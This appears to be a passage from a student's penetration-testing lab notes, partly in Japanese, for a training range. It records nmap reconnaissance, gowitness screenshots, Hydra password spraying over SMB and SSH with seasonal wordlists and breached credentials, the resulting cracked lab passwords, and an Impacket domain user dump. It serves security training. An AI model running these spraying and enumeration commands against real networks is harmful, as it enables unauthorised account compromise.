Warning: 10.130.10.115 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.116 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.117 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.118 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.119 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.120 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.123 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.124 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.125 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.126 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.127 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.128 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.129 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.130 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.133 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.136 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.137 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.138 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.139 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.140 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.141 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.144 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.145 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.146 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.147 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.148 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.149 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.152 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.153 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.154 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.155 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.156 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.157 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.158 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.159 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.162 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.165 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.166 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.167 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.168 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.169 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.170 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.173 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.174 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.175 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.176 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.177 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.180 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.181 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.182 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.183 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.184 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.185 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.186 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.187 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.190 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.193 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.194 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.195 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.196 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.197 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.198 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.199 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.200 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.201 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.202 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.203 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.204 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.205 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.206 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.207 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.208 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.209 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.210 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.211 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.212 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.213 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.214 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.215 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.216 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.217 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.218 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.219 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.220 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.221 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.222 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.223 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.224 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.225 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.226 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.227 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.228 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.229 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.230 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.231 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.232 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.233 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.234 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.235 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.236 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.237 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.238 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.239 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.240 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.241 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.242 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.245 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.246 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.247 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.248 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.249 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.250 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.251 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.252 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.253 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.254 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.255 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.12 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.26 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.47 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.48 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.55 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.56 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.63 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.64 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.76 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.85 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.92 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.93 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.102 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.103 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.105 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.106 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.113 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.114 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.121 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.122 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.131 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.132 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.134 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.135 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.142 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.143 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.150 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.151 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.160 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.161 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.163 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.164 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.171 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.172 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.178 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.179 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.188 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.189 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.191 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.192 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.0 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.34 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.35 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.244 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.77 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.73 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.74 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.84 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.243 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.25 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.33 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.21 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.7 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.5 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.23 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.6 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.44 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.4 giving up on port because retransmission cap hit (0).
Warning: 10.130.10.45 giving up on port because retransmission cap hit (0).
Nmap scan report for 10.130.10.4
Host is up (0.17s latency).
Not shown: 62 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
593/tcp open  http-rpc-epmap

Nmap scan report for 10.130.10.5
Host is up (0.17s latency).
Not shown: 62 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for 10.130.10.6
Host is up (0.17s latency).
Not shown: 62 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for 10.130.10.10
Host is up (0.16s latency).
Not shown: 62 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for 10.130.10.11
Host is up (0.16s latency).
Not shown: 62 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap scan report for 10.130.10.25
Host is up (0.16s latency).
Not shown: 59 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https
593/tcp open  http-rpc-epmap
808/tcp open  ccproxy-http

Post-scan script results:
| reverse-index: 
|   80/tcp: 10.130.10.5, 10.130.10.6, 10.130.10.10, 10.130.10.11, 10.130.10.25
|   443/tcp: 10.130.10.25
|   593/tcp: 10.130.10.4, 10.130.10.25
|_  808/tcp: 10.130.10.25
Nmap done: 256 IP addresses (13 hosts up) scanned in 11.28 seconds
sec560@560vm:~/Downloads$ 
```

```
sec560@560vm:~/Downloads$ sudo nmap 10.130.10.0/24 -n -p80,443 -PS80,443 --script http-headers,http-methods,http-robots.txt,http-auth-finder -oA /tmp/webservers
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-03-06 02:46 UTC
Nmap scan report for 10.130.10.5
Host is up (0.17s latency).

PORT    STATE    SERVICE
80/tcp  open     http
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
| http-headers: 
|   Content-Length: 1706
|   Content-Type: text/html
|   Last-Modified: Fri, 01 Jan 2049 00:00:00 GMT
|   Accept-Ranges: bytes
|   ETag: W/"0c0d66a3a44f61:0"
|   Server: Microsoft-IIS/10.0
|   Date: Fri, 06 Mar 2026 02:46:59 GMT
|   Connection: close
|   
|_  (Request type: HEAD)
443/tcp filtered https

Nmap scan report for 10.130.10.6
Host is up (0.17s latency).

PORT    STATE    SERVICE
80/tcp  open     http
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
| http-headers: 
|   Content-Length: 703
|   Content-Type: text/html
|   Last-Modified: Sun, 01 Mar 2026 00:23:15 GMT
|   Accept-Ranges: bytes
|   ETag: "e0dd8c9811a9dc1:0"
|   Server: Microsoft-IIS/10.0
|   Date: Fri, 06 Mar 2026 02:46:59 GMT
|   Connection: close
|   
|_  (Request type: HEAD)
443/tcp filtered https

Nmap scan report for 10.130.10.10
Host is up (0.17s latency).

PORT    STATE  SERVICE
80/tcp  open   http
| http-headers: 
|   Server: nginx/1.24.0 (Ubuntu)
|   Date: Fri, 06 Mar 2026 02:47:00 GMT
|   Content-Type: text/html
|   Content-Length: 615
|   Last-Modified: Sun, 01 Mar 2026 00:09:23 GMT
|   Connection: close
|   ETag: "69a383b3-267"
|   Accept-Ranges: bytes
|   
|_  (Request type: HEAD)
| http-methods: 
|_  Supported Methods: GET HEAD
443/tcp closed https

Nmap scan report for 10.130.10.11
Host is up (0.17s latency).

PORT    STATE  SERVICE
80/tcp  open   http
| http-headers: 
|   Server: nginx/1.24.0 (Ubuntu)
|   Date: Fri, 06 Mar 2026 02:47:00 GMT
|   Content-Type: text/html
|   Content-Length: 615
|   Last-Modified: Sun, 01 Mar 2026 00:09:42 GMT
|   Connection: close
|   ETag: "69a383c6-267"
|   Accept-Ranges: bytes
|   
|_  (Request type: HEAD)
| http-methods: 
|_  Supported Methods: GET HEAD
443/tcp closed https

Nmap scan report for 10.130.10.22
Host is up (0.17s latency).

PORT    STATE  SERVICE
80/tcp  closed http
443/tcp closed https

Nmap scan report for 10.130.10.25
Host is up (0.16s latency).

PORT    STATE SERVICE
80/tcp  open  http
| http-headers: 
|   Server: Microsoft-IIS/10.0
|   Date: Fri, 06 Mar 2026 02:47:00 GMT
|   Connection: close
|   Content-Length: 0
|   
|_  (Request type: GET)
443/tcp open  https
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

Nmap done: 256 IP addresses (6 hosts up) scanned in 14.91 seconds
sec560@560vm:~/Downloads$ 
```

#### 14: GoWitness

```
sec560@560vm:~/Downloads$ mkdir gowitness && cd gowitness
sec560@560vm:~/Downloads/gowitness$ gowitness scan nmap -f /tmp/webservers.xml --write-db -s screenshots 
2026/03/06 02:48:03 INFO result 🤖 target=http://10.130.10.6:80 status-code=200 title="IIS Windows Server" have-screenshot=true
2026/03/06 02:48:04 INFO result 🤖 target=http://10.130.10.5:80 status-code=200 title="" have-screenshot=true
2026/03/06 02:48:07 INFO result 🤖 target=http://10.130.10.10:80 status-code=200 title="Welcome to nginx!" have-screenshot=true
2026/03/06 02:48:11 INFO result 🤖 target=http://10.130.10.11:80 status-code=200 title="Welcome to nginx!" have-screenshot=true
2026/03/06 02:48:19 INFO result 🤖 target=https://10.130.10.25:443 status-code=200 title=Outlook have-screenshot=true
sec560@560vm:~/Downloads/gowitness$ 
```

```
sec560@560vm:~/Downloads/gowitness$ gowitness report server
2026/03/06 02:49:51 INFO starting web server host=127.0.0.1 port=7171

```

`http://127.0.0.1:7171/`

## Lab 2.2 - Password Guessing

### Linux

- 10.130.10.10: A Linux web server
- 10.130.10.4: A Windows Domain controller

対象組織にはパスワードポリシーが存在し、すべてのパスワードは8文字以上であること、かつ以下の5つの基準のうち3つを満たすことが要求されていると仮定する：

    番号
    大文字
    小文字
    特殊文字
    その他の文字

これは非常に標準的なポリシーです。「5つのカテゴリのうち3つ」が、マイクロソフトが「複雑な」パスワードと定義する基準

`https://www.skullsecurity.org/wiki/Passwords`

#### 1: Password Spray (SMB)

```
sec560@560vm:~/Downloads$ head /opt/passwords/facebook-f.last-100.txt
jsmith
ssmith
skhan
msmith
skumar
csmith
asmith
jjohnson
dsmith
akhan
sec560@560vm:~/Downloads$ 
```

```
sec560@560vm:~/Downloads$ hydra -L /opt/passwords/facebook-f.last-100.txt -p SEASONYEAR -m workgroup:{hiboxy} 10.130.10.4 smb2
Hydra v9.7dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-06 03:03:49
[DATA] max 16 tasks per 1 server, overall 16 tasks, 100 login tries (l:100/p:1), ~7 tries per task
[DATA] attacking smb2://10.130.10.4:445/workgroup:{hiboxy}
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-06 03:04:01
sec560@560vm:~/Downloads$ 
```


- `-L /opt/passwords/facebook-f.last-100.txt:` ユーザー名のリストを使用
- `-p SEASONYEAR: `正確な現在のSeasonYearパスワードを使用してください（例: "Summer2024"）
- `-m workgroup:{hiboxy}: `ドメイン コントローラーに接続するため、ドメインを指定する必要があります（注: {} が必要です）。
- `10.130.10.4: `ドメインコントローラーのIPアドレス（スキャンにより検出）
- `smb2: `プロトコル

```
sec560@560vm:~/Downloads$ grep -E "alee|janderson|ssmith|jlopez"  /opt/passwords/facebook-f.last-100.txt
ssmith
janderson
alee
jlopez
sec560@560vm:~/Downloads$
```

```
sec560@560vm:~/Downloads$ for Y in 2025 2026; do printf '%s\n' {Spring,Summer,Fall,Autumn,Winter}"$Y"{,\!} | tee -a pass.txt; done
Spring2025
Spring2025!
Summer2025
Summer2025!
Fall2025
Fall2025!
Autumn2025
Autumn2025!
Winter2025
Winter2025!
Spring2026
Spring2026!
Summer2026
Summer2026!
Fall2026
Fall2026!
Autumn2026
Autumn2026!
Winter2026
Winter2026!
sec560@560vm:~/Downloads$
```

```
sec560@560vm:~/Downloads$ hydra -L ./user.txt -P ./pass.txt -m workgroup:{hiboxy} 10.130.10.4 smb2
Hydra v9.7dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-06 03:26:17
[DATA] max 16 tasks per 1 server, overall 16 tasks, 80 login tries (l:4/p:20), ~5 tries per task
[DATA] attacking smb2://10.130.10.4:445/workgroup:{hiboxy}
[WARNING] 10.130.10.4 might accept any credential
[445][smb2] host: 10.130.10.4   login: ssmith   password: Spring2026!
[WARNING] 10.130.10.4 might accept any credential
[445][smb2] host: 10.130.10.4   login: janderson   password: Spring2026
[WARNING] 10.130.10.4 might accept any credential
[445][smb2] host: 10.130.10.4   login: alee   password: Winter2026
[WARNING] 10.130.10.4 might accept any credential
[445][smb2] host: 10.130.10.4   login: jlopez   password: Autumn2026!
1 of 1 target successfully completed, 4 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-06 03:26:26
sec560@560vm:~/Downloads$ 
```

#### 2: The dictionary

```
sec560@560vm:~/Downloads$ for Y in 1 24 25 26; do printf '%s\n' {Password,Welcome,Spring,Summer,Fall,Autumn,Winter}"$Y"{,\!} | tee -a simple.txt; done
Password1
Password1!
Welcome1
Welcome1!
Spring1
Spring1!
Summer1
Summer1!
Fall1
Fall1!
Autumn1
Autumn1!
Winter1
Winter1!
Password24
Password24!
Welcome24
Welcome24!
Spring24
Spring24!
Summer24
Summer24!
Fall24
Fall24!
Autumn24
Autumn24!
Winter24
Winter24!
Password25
Password25!
Welcome25
Welcome25!
Spring25
Spring25!
Summer25
Summer25!
Fall25
Fall25!
Autumn25
Autumn25!
Winter25
Winter25!
Password26
Password26!
Welcome26
Welcome26!
Spring26
Spring26!
Summer26
Summer26!
Fall26
Fall26!
Autumn26
Autumn26!
Winter26
Winter26!
sec560@560vm:~/Downloads$ wc -l simple.txt 
56 simple.txt
sec560@560vm:~/Downloads$ 
```

#### 3: Password Guessing (SSH)

```
sec560@560vm:~/Downloads$ hydra -l bgreen -P simple.txt 10.130.10.10 ssh
Hydra v9.7dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-06 03:17:43
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 56 login tries (l:1/p:56), ~4 tries per task
[DATA] attacking ssh://10.130.10.10:22/
[22][ssh] host: 10.130.10.10   login: bgreen   password: Password1
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-06 03:17:49
sec560@560vm:~/Downloads$ 
```

#### 4: Verifying Access

```
sec560@560vm:~/Downloads$ nmap -n -PS445 -p 445 --open 10.130.10.0/24 -oG - | awk '/Up/ { print $2 }' | tee 445.tcp
10.130.10.4
10.130.10.5
10.130.10.7
10.130.10.21
10.130.10.23
10.130.10.25
10.130.10.44
sec560@560vm:~/Downloads$ 
```

```
sec560@560vm:~/Downloads$ hydra -m workgroup:{hiboxy} -l bgreen -p Password1 -M 445.tcp smb2
Hydra v9.7dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-06 03:29:42
[DATA] max 1 task per 7 servers, overall 7 tasks, 1 login try (l:1/p:1), ~1 try per task
[DATA] attacking smb2://(7 targets):445/workgroup:{hiboxy}
[WARNING] 10.130.10.4 might accept any credential
[WARNING] 10.130.10.5 might accept any credential
[WARNING] 10.130.10.25 might accept any credential
[WARNING] 10.130.10.21 might accept any credential
[WARNING] 10.130.10.7 might accept any credential
[WARNING] 10.130.10.23 might accept any credential
[WARNING] 10.130.10.44 might accept any credential
[445][smb2] host: 10.130.10.4   login: bgreen   password: Password1
[445][smb2] host: 10.130.10.5   login: bgreen   password: Password1
[445][smb2] host: 10.130.10.7   login: bgreen   password: Password1
[445][smb2] host: 10.130.10.21   login: bgreen   password: Password1
[445][smb2] host: 10.130.10.25   login: bgreen   password: Password1
[445][smb2] host: 10.130.10.23   login: bgreen   password: Password1
[445][smb2] host: 10.130.10.44   login: bgreen   password: Password1
7 of 7 targets successfully completed, 7 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-06 03:29:44
sec560@560vm:~/Downloads$
```

#### 5: Breached Credentials

```
sec560@560vm:~/Downloads$ wc -l /opt/passwords/hiboxy-breach.txt
22 /opt/passwords/hiboxy-breach.txt
sec560@560vm:~/Downloads$ head /opt/passwords/hiboxy-breach.txt
abaird:Kstar123
aschmitt:Annika0410
bking:ThaBoss1
bking:David1993!
bwalker:Powder05
bwalker:CoDy8k65
ckhan:Panther101
csmith:Love_12345
cstone:Audrianna2
ejohnson:Connor2001
sec560@560vm:~/Downloads$ 
```

```
sec560@560vm:~/Downloads$ hydra -C /opt/passwords/hiboxy-breach.txt 10.130.10.4 -m workgroup:{hiboxy} smb2
Hydra v9.7dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-06 03:33:17
[DATA] max 16 tasks per 1 server, overall 16 tasks, 22 login tries, ~2 tries per task
[DATA] attacking smb2://10.130.10.4:445/workgroup:{hiboxy}
[WARNING] 10.130.10.4 might accept any credential
[WARNING] 10.130.10.4 might accept any credential
[445][smb2] host: 10.130.10.4   login: jmartin   password: Quincy626
[445][smb2] host: 10.130.10.4   login: bking   password: ThaBoss1
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-06 03:33:20
sec560@560vm:~/Downloads$ 
```

#### 6: Password Spraying all domain users

```
sec560@560vm:~/Downloads$ GetADUsers.py hiboxy.com/bgreen:Password1 -dc-ip 10.130.10.4 -all | tee adusers.txt
/usr/local/lib/python3.12/dist-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Querying 10.130.10.4 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator         Administrator@hiboxy.com        2026-03-01 00:20:34.828830  2026-03-05 12:43:31.575502 
Guest                                                 <never>              <never>             
SROCAdmin                                             2026-03-01 00:12:53.525110  <never>             
krbtgt                                                2026-03-01 00:19:35.393827  <never>             
SVC_SQLService        SVC_SQLService@hiboxy.com       2026-03-01 00:20:42.998269  <never>             
SVC_SQLService2                                       2026-03-01 00:20:43.108108  <never>             
krosterman                                            2026-03-01 00:20:43.155525  <never>             
smorgan               smorgan@hiboxy.com              2026-03-01 00:20:43.217921  <never>             
sroc.admin                                            2026-03-01 00:20:43.265032  2026-03-06 03:33:41.307881 
tduncan                                               2026-03-01 00:20:43.312316  2026-03-01 00:21:24.495821 
antivirus             antivirus@hiboxy.com            2026-03-01 00:20:44.411694  2026-03-06 03:25:32.429356 
aallen                aallen@hiboxy.com               2026-03-01 00:20:44.474368  <never>             
aalvarado             aalvarado@hiboxy.com            2026-03-01 00:20:44.537180  <never>             
abaird                abaird@hiboxy.com               2026-03-01 00:20:44.600266  <never>             
abates                abates@hiboxy.com               2026-03-01 00:20:44.647291  <never>             
abecker               abecker@hiboxy.com              2026-03-01 00:20:44.709938  <never>             
abrown                abrown@hiboxy.com               2026-03-01 00:20:44.772739  <never>             
acarter               acarter@hiboxy.com              2026-03-01 00:20:44.835587  <never>             
achavez               achavez@hiboxy.com              2026-03-01 00:20:44.898584  <never>             
acoleman              acoleman@hiboxy.com             2026-03-01 00:20:44.961294  <never>             
acombs                acombs@hiboxy.com               2026-03-01 00:20:45.024274  <never>             
adavis                adavis@hiboxy.com               2026-03-01 00:20:45.087185  <never>             
adawson               adawson@hiboxy.com              2026-03-01 00:20:45.149813  <never>             
afitzgerald           afitzgerald@hiboxy.com          2026-03-01 00:20:45.212516  <never>             
agarcia               agarcia@hiboxy.com              2026-03-01 00:20:45.275492  <never>             
agardner              agardner@hiboxy.com             2026-03-01 00:20:45.338138  2026-03-02 05:59:11.353941 
ahall                 ahall@hiboxy.com                2026-03-01 00:20:45.400915  <never>             
ahill                 ahill@hiboxy.com                2026-03-01 00:20:45.463744  <never>             
aholmes               aholmes@hiboxy.com              2026-03-01 00:20:45.526567  <never>             
ajackson              ajackson@hiboxy.com             2026-03-01 00:20:45.589373  <never>             
ajimenez              ajimenez@hiboxy.com             2026-03-01 00:20:45.652226  <never>             
ajordan               ajordan@hiboxy.com              2026-03-01 00:20:45.730700  <never>             
akerr                 akerr@hiboxy.com                2026-03-01 00:20:45.793667  <never>             
alee                  alee@hiboxy.com                 2026-03-01 00:20:45.903453  2026-03-06 03:26:22.877528 
alucas                alucas@hiboxy.com               2026-03-01 00:20:45.966277  <never>             
amarsh                amarsh@hiboxy.com               2026-03-01 00:20:46.029106  <never>             
amartinez             amartinez@hiboxy.com            2026-03-01 00:20:46.091924  <never>             
amaxwell              amaxwell@hiboxy.com             2026-03-01 00:20:46.154883  <never>             
amendoza              amendoza@hiboxy.com             2026-03-01 00:20:46.217531  <never>             
amorgan               amorgan@hiboxy.com              2026-03-01 00:20:46.280324  <never>             
amorris               amorris@hiboxy.com              2026-03-01 00:20:46.343154  <never>             
aowen                 aowen@hiboxy.com                2026-03-01 00:20:46.405970  <never>             
aparker               aparker@hiboxy.com              2026-03-01 00:20:46.469014  <never>             
apena                 apena@hiboxy.com                2026-03-01 00:20:46.563058  2026-03-02 06:33:03.562654 
aponce                aponce@hiboxy.com               2026-03-01 00:20:46.625980  <never>             
aramirez              aramirez@hiboxy.com             2026-03-01 00:20:46.688638  <never>             
areyes                areyes@hiboxy.com               2026-03-01 00:20:46.751500  <never>             
arobertson            arobertson@hiboxy.com           2026-03-01 00:20:46.798828  <never>             
arowland              arowland@hiboxy.com             2026-03-01 00:20:46.861368  <never>             
arussell              arussell@hiboxy.com             2026-03-01 00:20:46.924193  <never>             
asanchez              asanchez@hiboxy.com             2026-03-01 00:20:46.987109  <never>             
